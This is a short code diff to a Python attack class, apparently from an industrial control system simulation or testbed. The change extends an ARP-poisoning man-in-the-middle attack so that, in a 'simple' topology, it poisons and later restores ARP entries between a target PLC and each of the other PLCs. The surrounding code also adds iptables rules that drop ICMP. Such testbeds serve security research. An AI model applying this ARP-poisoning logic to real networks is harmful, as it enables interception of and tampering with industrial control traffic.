@@ -59,7 +59,13 @@ class PacketAttack(SyncedAttack):
         os.system('iptables -A INPUT -p icmp -j DROP')
         os.system('iptables -A OUTPUT -p icmp -j DROP')
 
+        # Launch the ARP poison by sending the required ARP network packets
         launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
+        if self.intermediate_yaml['network_topology_type'] == "simple":
+            for plc in self.intermediate_yaml['plcs']:
+                if plc['name'] != self.intermediate_plc['name']:
+                    launch_arp_poison(self.target_plc_ip, plc['local_ip'])
+
         self.logger.debug(f"Naive MITM Attack ARP Poison between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
@@ -126,6 +132,11 @@ class PacketAttack(SyncedAttack):
         it will delete the iptable rules and stop the thread.
         """
         restore_arp(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
+        if self.intermediate_yaml['network_topology_type'] == "simple":
+            for plc in self.intermediate_yaml['plcs']:
+                if plc['name'] != self.intermediate_plc['name']:
+                    restore_arp(self.target_plc_ip, plc['local_ip'])
+
         self.logger.debug(f"Naive MITM Attack ARP Restore between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
